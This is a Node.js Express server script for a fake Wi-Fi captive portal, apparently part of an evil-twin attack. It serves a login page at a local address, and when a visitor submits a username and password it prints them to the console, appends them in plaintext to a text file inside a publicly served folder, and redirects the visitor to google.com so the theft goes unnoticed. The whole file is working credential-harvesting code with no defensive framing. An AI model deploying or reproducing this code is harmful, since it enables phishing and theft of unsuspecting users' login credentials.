
// Node JS development web server
var express = require("express");
var app = express();

// Working with files
const fs = require('fs');
// The option to pull the password from the body of the POST request
const BodyParser = require('body-parser')
app.use(BodyParser.urlencoded({extended: true}))


// app.use(express.static('public'));
app.use('/images', express.static('images'));
app.use('/css', express.static('css'));
app.use('/js', express.static('js'));
app.use('/web', express.static('web'));
app.use('/html', express.static('html'));


/* serves main page */
app.get("/", function(req, res) {
  console.log('The client entered to the captive portal');
  res.sendFile(__dirname+'/index.html');
 });

 
 app.post('/password', (req, res) => {
  // In POST request the information is in the body
  // The information in our case is the password that the client entered
  const username = req.body.username;
  const password = req.body.password;
  console.log("The client enter data:");
  console.log(`username: ${username}\tpassword: ${password}`)
  console.log("Save to client_data.txt");
  // // Write the data to file
  fs.appendFileSync('./web/html/client_data.txt', `username: ${username} \tpassword: ${password} \n`);
  res.redirect("https://www.google.com/")
});

// The port the web server listen to
var port = 70
// Define the port that the web server will listen to
app.listen(port, function() {
    console.log(`WebServer is up. Listening at 192.168.24.1:${port}`);

})
